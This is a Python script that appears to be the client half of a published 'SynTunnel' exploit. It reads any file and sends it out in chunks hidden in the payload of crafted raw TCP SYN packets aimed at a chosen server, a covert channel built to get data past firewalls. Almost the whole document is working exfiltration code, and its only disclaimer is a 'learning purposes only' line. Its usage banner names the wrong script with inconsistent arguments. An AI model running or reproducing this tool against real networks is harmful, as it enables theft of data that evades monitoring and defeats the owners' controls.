#####################################################################################################################
#                                                                                                                   #
# The exploit implemented with client and server scripts, this is the CLIENT.                                       #
# This tool is for learning purposes only, The authors doesn't responsible for any damage caused by using this tool #
# Discovered By: Stas Volfus                                                                                        #
# Exploit written by : Stas Volfus, Idan Cohen, Kasif Dekel                                                         #
# Usage : SynTunnel_s.py port filename       (requires root / admin)                                                #
#                                                                                                                   #
#####################################################################################################################

import sys
import socket
from struct import *

def makeTcpRequest(stringData, serverIP, Port):
	rawSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
	packet = makeIpHeader(serverIP) + makeTcpHeader(serverIP, Port) + stringData
	rawSocket.sendto(packet, (serverIP , 0 ))  
	
	# synReq=IP(dst=ServerIP)/TCP(dport=Port, flags="S")/Raw(load=stringData)
	# send(synReq,iface="eth0", verbose=False)
	return

def makeIpHeader(dest_ip):
    # IP Header Fields
    version = 4
    header_length = 5
    tos = 0
    tot_len = 0
    ip_id = 12354
    fragment_offset = 0
    ttl = 225
    protocol = 6 #socket.IPPROTO_TCP
    checksum = 0
    src_ip = '192.168.1.11' # Will Be Decided By Kernel
    saddr = socket.inet_aton(src_ip)
    daddr = socket.inet_aton(dest_ip)
    version = (version << 4) + header_length
    ipHeader = pack('!BBHHHBBH4s4s' , version, tos, tot_len, ip_id, fragment_offset, ttl, protocol, checksum, saddr, daddr)
    return ipHeader

def makeTcpHeader(dest_ip, dest_port):
    global globalSeq
    # TCP Header Fields
    source_port = 1234
    seq = globalSeq
    globalSeq = globalSeq + 1
    ack_seq = 0
    data_offset = 5
    # TCP flags
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(15)
    check = 0
    urg_ptr = 0
    offset_res = (data_offset << 4) + 0
    flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
    tcp_header = pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, flags,  window, check, urg_ptr)

    # Pseudo Header Fields
    src_ip = '192.168.1.11' # Will Be Decided By Kernel
    src_address = socket.inet_aton(src_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = pack('!4s4sBBH', src_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header

    tcpChecksum = doChecksum(psh)
    tcpHeader = pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, flags,  window, tcpChecksum, urg_ptr)

    return tcpHeader	
	
def doChecksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
        s = s + w
     
    s = (s>>16) + (s & 0xffff);
    s = s + (s >> 16);
     
    s = ~s & 0xffff
    return s	
	
def getFileByteCode(filePath):
	mainFile = open(filePath, "rb")
	data = mainFile.read() 
	mainFile.close()
	return data

def sendFileWithSyn(fileData, serverIP, PacketDataSize, Port):
	i = 0
	packet = 1
	fileSize = len(fileData)
	FragmentsAmount = fileSize / PacketDataSize + 1

	print 'Sending ' + str(FragmentsAmount) + ' Packets'
	while i < fileSize:
		makeTcpRequest(fileData[i:i+PacketDataSize], serverIP, Port)
		print 'Finished Sending Part ' + str(packet) + ' ' + fileData[i:i+PacketDataSize]
		packet = packet + 1
		i = i + PacketDataSize
	
def Main(argv):
	print "########################################################################################################"
	print "#                                                                                                      #"
	print "#The exploit implemented with client and server scripts, this is the CLIENT.                           #"
	print "#The authors doesn't responsible for any damage caused by using this tool                              #"
	print "#Discovered By: Stas Volfus                                                                            #"
	print "#Exploit written by : Stas Volfus, Idan Cohen, Kasif Dekel                                             #"
	print "#Usage : SynTunnel_s.py [port] [port] [filename] [Bytes(default=100)]          (requires root)         #"
	print "#                                                                                                      #"
	print "########################################################################################################"
	
	if len(sys.argv) < 4 or len(sys.argv) > 5:
		print "\n[-] SynTunnel_c.py [ip] [port] [file_path] [Bytes(default=100)]"
		exit()

	if len(sys.argv) == 5:
		PacketDataSize = int(sys.argv[4])
		
	else:
		PacketDataSize = 100

	
	serverIP = sys.argv[1]
	Port = int(sys.argv[2])
	filePath = sys.argv[3]
	fileData = getFileByteCode(filePath)
	sendFileWithSyn(fileData, serverIP, PacketDataSize, Port)	
	return;

globalSeq = 13232
Main(sys.argv)
